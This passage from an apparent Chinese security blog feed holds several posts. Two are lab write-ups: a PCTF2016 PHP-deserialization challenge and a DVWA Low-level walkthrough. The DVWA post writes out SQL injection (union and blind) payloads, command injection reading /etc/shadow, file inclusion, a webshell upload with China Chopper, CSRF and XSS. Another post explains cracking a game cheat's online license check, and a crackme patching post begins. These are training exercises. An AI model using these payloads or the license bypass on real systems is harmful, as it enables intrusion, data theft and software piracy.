src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/b6l8ac8CCD.png?imageslim" alt="mark"></p><p>这里提示我们flag就在pctf.php里，但是showimg.php中过滤了pctf，那么我们又注意到index.php中最后<br><code>$x=unserialize($g)</code><br>也就是反序列化字符串，所以我们可以自己将pctf.php序列化然后传入</p><p>构造类似shield.php中的类如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Shield &#123;</span><br><span class="line">        public $file;</span><br><span class="line">        function __construct($filename = &apos;&apos;) &#123;</span><br><span class="line">            $this -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$x = new Shield();</span><br><span class="line">$x -&gt; file = &apos;pctf.php&apos;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>运行<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/L5i32666c2.png?imageslim" alt="mark"><br>将得到结果传入<br>即访问的是</p><pre><code>index.php?class=序列化字符串</code></pre><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180311/IL7E600d64.png?imageslim" alt="mark"></p><p>得到flag</p><p>完结</p><p>From <a href="https://kabeor.github.io/PCTF2016 Web300神盾局的秘密(反序列化漏洞">https://kabeor.github.io/PCTF2016 Web300神盾局的秘密(反序列化漏洞)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PCTF2016-Web300神盾局的秘密-反序列化漏洞&quot;&gt;&lt;a href=&quot;#PCTF2016-Web300神盾局的秘密-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;PCTF2016 Web300神盾局的秘密(反序列化漏洞)&quot;&gt;&lt;/a&gt;P
      
    
    </summary>
    
      <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
      <category term="WriteUP" scheme="https://kabeor.github.io/categories/Web/WriteUP/"/>
    
    
  </entry>
  
  <entry>
    <title>对某游戏辅助的网络验证破解</title>
    <link href="https://kabeor.github.io/%E5%AF%B9%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/"/>
    <id>https://kabeor.github.io/对某游戏辅助的网络验证破解/</id>
    <published>2018-03-06T09:18:34.262Z</published>
    <updated>2018-03-06T10:49:38.456Z</updated>
    
    <content type="html"><![CDATA[<h1 id="对某游戏辅助的网络验证破解"><a href="#对某游戏辅助的网络验证破解" class="headerlink" title="对某游戏辅助的网络验证破解"></a>对某游戏辅助的网络验证破解</h1><p>吾爱破解上看到一个荒野行动辅助的破解，于是自己也试了一下</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/b4djk0EaI4.png?imageslim" alt="mark"></p><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>先查壳，Detect It Easy不知道为什么查壳是UPX，Exeinfo PE和PEID看区段是.esp，所以是ES protect壳<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/B23GEaBFGe.png?imageslim" alt="mark"><br>使用WsUnPacker（通用脱壳机），直接脱进去就生成了一个dump文件，可以直接运行</p><h2 id="OD分析"><a href="#OD分析" class="headerlink" title="OD分析"></a>OD分析</h2><p>把软件拖入OD 会发现提示（代码被可能被压缩），点否</p><p>搜索字符串<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/mCe4C4KhL2.png?imageslim" alt="mark"></p><pre><code>eydata.net</code></pre><p>是易游的网址</p><p>需要网络验证，那么我们抓包</p><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>sniff开启抓包，打开程序随便输入卡密，抓到post请求<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/l8ka7GF6h3.png?imageslim" alt="mark"></p><p>画住的部分就是我们要找的了</p><p>回到od字符串，从那里进入<br>进入后下断点，F9运行，随意输入，程序停在断点处，F8步过一次，右下角堆栈出现字符串</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/aDl3I2EIC7.png?imageslim" alt="mark"></p><p>右键数据窗口跟随，HEX窗口二进制编辑<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/GCaLFi43cd.png?imageslim" alt="mark"></p><p>记住不选保持大小，注意后面有个1.0，是代表版本，后面有用</p><h2 id="山寨登录验证"><a href="#山寨登录验证" class="headerlink" title="山寨登录验证"></a>山寨登录验证</h2><p>所以为了山寨一个登录验证，我们也需要去注册一个，注意要注册的是开发者入口<br>进去后找到webapi，复制红框里的那一串，稍后要用，并且开启接口<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/8gJF71IhFD.png?imageslim" alt="mark"><br>把复制的东西粘贴在刚刚的HEX里，保存文件</p><p>在我们的账户中添加一个用户，复制生成的卡密，粘贴后登录<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180306/6checAHBc3.png?imageslim" alt="mark"></p><p>成功，然而这坑爹东西还没上线就让封了hhh</p><p>From <a href="https://kabeor.github.io/对某游戏辅助的网络验证破解/">https://kabeor.github.io/对某游戏辅助的网络验证破解/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;对某游戏辅助的网络验证破解&quot;&gt;&lt;a href=&quot;#对某游戏辅助的网络验证破解&quot; class=&quot;headerlink&quot; title=&quot;对某游戏辅助的网络验证破解&quot;&gt;&lt;/a&gt;对某游戏辅助的网络验证破解&lt;/h1&gt;&lt;p&gt;吾爱破解上看到一个荒野行动辅助的破解，于是自己也试了
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="破解" scheme="https://kabeor.github.io/tags/%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="网络验证" scheme="https://kabeor.github.io/tags/%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>DVWA的安装与Low级别的web漏洞</title>
    <link href="https://kabeor.github.io/DVWA%20low%E7%BA%A7%E5%88%AB%E6%B5%8B%E8%AF%95/"/>
    <id>https://kabeor.github.io/DVWA low级别测试/</id>
    <published>2018-03-05T05:09:08.352Z</published>
    <updated>2018-03-11T08:46:11.632Z</updated>
    
    <content type="html"><![CDATA[<p>#DVWA的安装与Low级别的web漏洞<br>    <a href="http://www.freebuf.com/author/lonehand" target="_blank" rel="noopener">http://www.freebuf.com/author/lonehand</a></p><p>##安装DVWA<br>进入github下载: <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>把解压后的文件放在WWW文件夹下<br>进入DVWA，打开config目录里的config.inc.php<br>修改数据库账号密码</p><pre><code>$_DVWA = array();$_DVWA[ &apos;db_server&apos; ]   = &apos;127.0.0.1&apos;;$_DVWA[ &apos;db_database&apos; ] = &apos;dvwa&apos;;$_DVWA[ &apos;db_user&apos; ]     = &apos;root&apos;;$_DVWA[ &apos;db_password&apos; ] = &apos;123&apos;;</code></pre><p>打开<a href="http://127.0.0.1/DVWA/setup.php，点击下面的按钮，这样就会创建数据库了" target="_blank" rel="noopener">http://127.0.0.1/DVWA/setup.php，点击下面的按钮，这样就会创建数据库了</a><br>（密码需要和MYSQL密码一致，忘记可在phpstudy中重置）</p><p>创建好后自动跳转到登陆首页<br>默认账号密码admin/password<br><img src="https://i.loli.net/2017/11/14/5a0ada8bf1286.png" alt="20170208221234546.png"></p><blockquote><p>allow_url_include的修改</p></blockquote><p>phpstudy默认为off<br>去phpinfo看Loaded Configuration File发现指向C:\phpstudy\php\php-5.4.45\php.ini，于是去这里查找并修改off为on</p><p>##Low级别测试<br>DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。</p><p>###Brute Force（暴力（破解））</p><blockquote><p>方法一</p></blockquote><p>1.抓包<br>2.右键将包发送到intruder中<br>3.把默认变量全部清除，然后选中密码，单击“Add”按钮将之设为需要破解的变量<br>4.由于只有一个变量，因而“Attack type”攻击类型这里选择Sniper。<br>然后在“Payloads”选项中进行设置，由于只有一个变量，因而“Payload set”自动设置为1，“Payload type”这里设置为“Brute forcer”。在下面的“Payload Options”中设置暴力破解所采用的字符集，以及最小和最大密码长度。<br>5.在菜单栏中选择“Intruder/Start attack”，就可以开始暴力破解<br>6尝试在爆破结果中找到正确的密码，可以看到password的响应包长度与众不同</p><blockquote><p>方法二</p></blockquote><ol><li><p>Username: admin’ or ’1′=’1<br>Password:（空）<br>注入成功</p></li><li><p>Username: admin’ #<br>Password :（空）<br>注入成功</p></li></ol><p>###Command Injection（命令行注入）<br>命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一</p><blockquote><p>漏洞利用</p></blockquote><p>window和linux系统都可以用&amp;&amp;来执行多条命令</p><pre><code>127.0.0.1&amp;&amp;net user</code></pre><p>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件</p><p>###CSRF（跨站请求伪造）<br>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p><p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制</p><p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p>我们可以使用短链接来隐藏URL，因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。</p><blockquote><p>漏洞利用</p></blockquote><p>构造url<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/？password_new=password&amp;password_conf=password&amp;Change=Change#" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/csrf/？password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成password</p><p>###File Inclusion（文件包含）<br>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p><p>服务器端对page参数没有做任何的过滤跟检查。服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><blockquote><p>漏洞利用</p></blockquote><p>1.本地文件包含</p><p>构造url<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/？page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/？page=/etc/shadow</a><br>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<br>    C:\phpstudy\WWW<br>构造url（绝对路径）<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpstudy\WWW\dvwa\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpstudy\WWW\dvwa\php.ini</a><br>成功读取了服务器的php.ini文件<br>    ; This file attempts to overwrite the original php.ini file. Doesnt always work. magic_quotes_gpc = Off allow_url_fopen = On allow_url_include = On<br>构造url（相对路径）<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpstudy\WWW\dvwa\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpstudy\WWW\dvwa\php.ini</a><br>加这么多..\是为了保证到达服务器的C盘根目录</p><p>2.远程文件包含<br>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下<br><img src="http://image.3001.net/images/20161106/14784222814815.png" alt=""></p><p>构造url<br>    <a href="http://127.0.0.1/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</a><br>成功在服务器上执行了phpinfo函数<br>为了增加隐蔽性，可以对<a href="http://192.168.5.12/phpinfo.txt进行编码" target="_blank" rel="noopener">http://192.168.5.12/phpinfo.txt进行编码</a><br>同样可以执行成功</p><p>###File Upload（文件上传）<br>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p><p>服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p><blockquote><p>漏洞利用</p></blockquote><p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。<br>上传文件hack.php<br><img src="http://image.3001.net/images/20161108/14785912161713.png" alt=""><br>上传成功，并且返回了上传路径</p><p>打开中国菜刀，右键添加，地址栏填入上传文件所在路径<br>    <a href="http://127.0.0.1/dvwa/hackable/uploads/hack.php" target="_blank" rel="noopener">http://127.0.0.1/dvwa/hackable/uploads/hack.php</a><br>参数名（一句话木马口令）为apple<br><img src="http://image.3001.net/images/20161108/14785912718652.png!small" alt=""></p><p>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。<br>可以下载、修改服务器的所有文件。可以打开服务器的虚拟终端。</p><p>###Insecure CAPTCHA （不安全的验证码）<br>Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。</p><p>服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p><blockquote><p>漏洞利用</p></blockquote><p>1.通过构造参数绕过验证过程的第一步<br>首先输入密码，点击Change按钮，抓包：<br>因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数）</p><p>更改step参数绕过验证码：<br><img src="http://image.3001.net/images/20161110/14787628821104.png!small" alt=""></p><p>在Burpsuite中右键send to Repeater，在Repeater中点击go<br>修改密码成功</p><p>###SQL Injection（SQL注入）<br>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。<br>自动化的注入神器sqlmap</p><blockquote><p>手工注入思路</p></blockquote><p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解SQL查询语句中的字段数<br>3.确定显示的字段顺序<br>4.获取当前数据库<br>5.获取数据库中的表<br>6.获取表中的字段名<br>7.下载数据</p><blockquote><p>漏洞利用</p></blockquote><p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。<br>现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。</p><p>1.判断是否存在注入，注入是字符型还是数字型<br>输入1<br>输入1’and ‘1’ =’2<br>输入1’or ‘1234 ’=’1234<br>返回多个结果，说明存在字符型注入。</p><p>2.猜解SQL查询语句中的字段数<br>输入1′ or 1=1 order by 1 #<br>输入1′ or 1=1 order by 2 #<br>     ……….<br>（这里也可以通过输入union select 1,2,3…来猜解字段数）</p><p>3.确定显示的字段顺序<br>输入1′ union select 1,2 #     ，查询成功：说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…</p><p>4.获取当前数据库<br>输入1′ union select 1,database() #</p><p>5.获取数据库中的表<br>输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</p><p>6.获取表中的字段名<br>输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #</p><p>7.下载数据<br>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><p>###SQL Injection（Blind）（SQL盲注）<br>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><blockquote><p>手工盲注思路</p></blockquote><p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注</p><blockquote><p>手工盲注的步骤（可与之前的手工注入作比较）：</p></blockquote><p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解当前数据库名<br>3.猜解数据库中的表名<br>4.猜解表中的字段名<br>5.猜解数据</p><p>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种</p><blockquote><p>基于布尔的盲注：</p></blockquote><p>1.判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在<br>输入1’ and 1=1 #，显示存在<br>输入1’ and 1=2 #，显示不存在<br>说明存在字符型的SQL盲注。</p><p>2.猜解当前数据库名</p><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><p>输入1’ and length(database())=1 #，显示不存在；</p><p>输入1’ and length(database())=2 #，显示不存在；</p><p>输入1’ and length(database())=3 #，显示不存在；</p><p>输入1’ and length(database())=4 #，显示存在：</p><p>说明数据库名长度为4。</p><p>下面采用二分法猜解数据库名。</p><p>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p><p>…<br>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p><p>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><p>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在</p><p>1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在<br>说明数据库中共有两个表。</p><p>接着挨个猜解表名：</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p><p>…</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在<br>说明第一个表名长度为9。</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</p><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p><p>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><p>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在</p><p>…</p><p>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在<br>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p><p>…</p><p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</p><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。</p><p>5.猜解数据</p><p>同样采用二分法。</p><p>还可以使用基于时间的盲注：</p><p>1.判断是否存在注入，注入是字符型还是数字型</p><p>输入1’ and sleep(5) #，感觉到明显延迟；</p><p>输入1 and sleep(5) #，没有延迟；<br>说明存在字符型的基于时间的盲注。</p><p>2.猜解当前数据库名</p><p>首先猜解数据名的长度：</p><p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=4,sleep(5),1) # 明显延迟<br>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p><p>…</p><p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p><p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p><p>说明数据库名的第一个字符为小写字母d。</p><p>…<br>重复上述步骤，即可猜解出数据库名。</p><p>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p><p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟<br>说明数据库中有两个表。</p><p>接着挨个猜解表名：</p><p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p><p>…</p><p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟<br>说明第一个表名的长度为9个字符。</p><p>采用二分法即可猜解出表名。</p><p>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p><p>…</p><p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟<br>说明users表中有8个字段。</p><p>接着挨个猜解字段名：</p><p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p><p>…</p><p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟<br>说明users表的第一个字段长度为7个字符。</p><p>采用二分法即可猜解出各个字段名。</p><p>5.猜解数据</p><p>同样采用二分法。</p><p>###XSS（Reflected）（反射型跨站脚本）</p><blockquote><p>XSS</p></blockquote><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p><blockquote><p>反射型XSS</p></blockquote><p>代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</p><blockquote><p><em>漏洞利用</em></p></blockquote><p>输入<br><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>，成功弹框</p><blockquote><p>存储型XSS</p></blockquote><p>对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p><blockquote><p>漏洞利用</p></blockquote><p>message一栏输入<br><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>，成功弹框</p><p>name一栏前端有字数限制，抓包改为<br><code>&lt;script&gt;alert(/name/)&lt;/script&gt;</code><br><img src="http://image.3001.net/images/20161223/14824827265355.png!small" alt=""><br>成功弹框</p><p>From <a href="https://kabeor.github.io/DVWA low级别测试/">https://kabeor.github.io/DVWA low级别测试/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#DVWA的安装与Low级别的web漏洞&lt;br&gt;    &lt;a href=&quot;http://www.freebuf.com/author/lonehand&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.freebuf.com/author
      
    
    </summary>
    
      <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
      <category term="渗透" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/"/>
    
      <category term="工具集" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    
    
      <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
      <category term="DVWA，渗透" scheme="https://kabeor.github.io/tags/DVWA%EF%BC%8C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>001_Acid_burn.exe</title>
    <link href="https://kabeor.github.io/001_Acid_burn.exe/"/>
    <id>https://kabeor.github.io/001_Acid_burn.exe/</id>
    <published>2018-03-01T13:05:54.150Z</published>
    <updated>2018-03-01T14:07:26.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="001-Acid-burn-exe"><a href="#001-Acid-burn-exe" class="headerlink" title="001_Acid_burn.exe"></a>001_Acid_burn.exe</h1><p>#爆破法</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>（这段的图是借FREEBUF的）</p><p>程序是Delphi3.x.x写的,无壳</p><p>程序运行时会弹出一个NAG窗口，标题是”hello you have to kill me”;这个窗口是要去除的。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/g8EIKh5BGl.jpg?imageslim" alt="mark"></p><p>然后点击确定后进入程序的主窗口。</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/ke492EgA3d.jpg?imageslim" alt="mark"></p><p>进去后发现有两个按钮，根据按钮上的字符串判断应该是需要输入序列号和名称的位置。</p><p>首先看下左边那个按钮，点击进去看下情况，发现有两个输入框，分别是输入用户名和序列号，然后点击Check it Baby，程序会进行校验，校验失败会弹出下面窗口，提醒你try again！</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/I5j71aKDDh.jpg?imageslim" alt="mark"></p><p>可以发现上面这个位置是一个需要破解的点。</p><p>然后点击I give up按钮返回到程序的主界面，看下右边那个按钮的情况。</p><p>点击进去后发现有一个输入框，提醒你输入序列号，然后点击Check it Baby，程序会进行校验，校验失败会弹出下面窗口，提醒你Failed！</p><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/5bk1fC0gl5.jpg?imageslim" alt="mark"></p><p>记录下这个位置也是一个需要破解的点。</p><pre><code>综上所述，我们可以看到这个程序有三个点需要破解：1，程序主界面之前的一个NAG窗口2，Serial/Name校验页面3，Serial校验页面</code></pre><h2 id="NAG窗口去除"><a href="#NAG窗口去除" class="headerlink" title="NAG窗口去除"></a>NAG窗口去除</h2><p><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/c0JBk61EJ8.png?imageslim" alt="mark"><br>直接F8，在0042FD97call弹窗，于是在此F2，重新运行，在断点处F7进入，继续F8<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/Bg8IGKGhle.png?imageslim" alt="mark"><br>在00429FC2处再次弹窗，于是再次下断点并从这里进入<br><img src="http://p29uh0fw7.bkt.clouddn.com/kabeo/180301/l8c9JeK294.png?imageslim" 